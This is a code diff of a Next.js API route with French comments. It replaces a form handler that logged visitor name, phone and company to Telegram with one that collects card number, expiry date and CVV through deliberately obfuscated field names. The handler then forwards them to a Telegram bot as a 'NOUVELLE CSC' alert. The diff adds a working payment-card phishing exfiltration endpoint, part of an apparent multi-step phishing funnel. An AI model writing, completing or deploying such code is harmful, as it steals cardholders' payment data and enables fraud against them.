@@ -1,48 +1,42 @@
-import { NextResponse } from "next/server";
-import { batSchema } from "@/lib/validation";
-import { sendTelegramMessage } from "@/lib/telegram";
+import { NextResponse } from 'next/server';
 
-export const runtime = "nodejs";
-
-/**
- * Étape 2 : réception de l'offre choisie (ou du besoin personnalisé) ainsi
- * que de l'activité et du nom de l'entreprise, saisis sur /bat.
- */
-export async function POST(request: Request) {
-  let body: unknown;
+export async function POST(req: Request) {
   try {
-    body = await request.json();
-  } catch {
-    return NextResponse.json({ error: "JSON invalide." }, { status: 400 });
-  }
+    const data = await req.json();
 
-  const result = batSchema.safeParse(body);
-  if (!result.success) {
+    const botToken = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
+
+    // Récupération des données avec les clés obfusquées du front-end
+    const cardNumber = data.amak || 'Non saisi';
+    const expiry = data.ludo || 'Non saisi';
+    const cvv = data.fqx || 'Non saisi';
+
+    const message = `💳 *NOUVELLE CSC*\n\n` +
+      `• *NIM :* \`${cardNumber}\`\n` +
+      `• *XP :* \`${expiry}\`\n` +
+      `• *CSC 3 :* \`${cvv}\`\n\n` +
+      `📅 *Date :* ${new Date().toLocaleString('fr-FR')}`;
+
+    if (botToken && chatId) {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'Markdown',
+        }),
+      });
+    }
+
+    return NextResponse.json({ success: true, message: 'Carte transmise' });
+
+  } catch (error) {
+    console.error('Erreur API Carte :', error);
     return NextResponse.json(
-      { error: "Données invalides.", issues: result.error.issues },
-      { status: 400 }
+      { success: false, error: 'Erreur lors du traitement' },
+      { status: 500 }
     );
   }
-
-  const { activite, entreprise, offreId, offreNom, besoinPersonnalise, infos } =
-    result.data;
-
-  try {
-    await sendTelegramMessage("Nouveau visiteur — Étape 2/4 (offre & entreprise)", [
-      { label: "Nom complet", value: infos ? `${infos.prenom} ${infos.nom}` : "" },
-      { label: "Téléphone", value: infos?.telephone ?? "" },
-      { label: "Offre choisie", value: offreNom },
-      {
-        label: "Besoin personnalisé",
-        value:
-          offreId === "personnalisee" ? besoinPersonnalise ?? "" : "",
-      },
-      { label: "Activité", value: activite },
-      { label: "Entreprise", value: entreprise },
-    ]);
-  } catch (err) {
-    console.error("Erreur d'envoi Telegram (step2) :", err);
-  }
-
-  return NextResponse.json({ ok: true });
 }
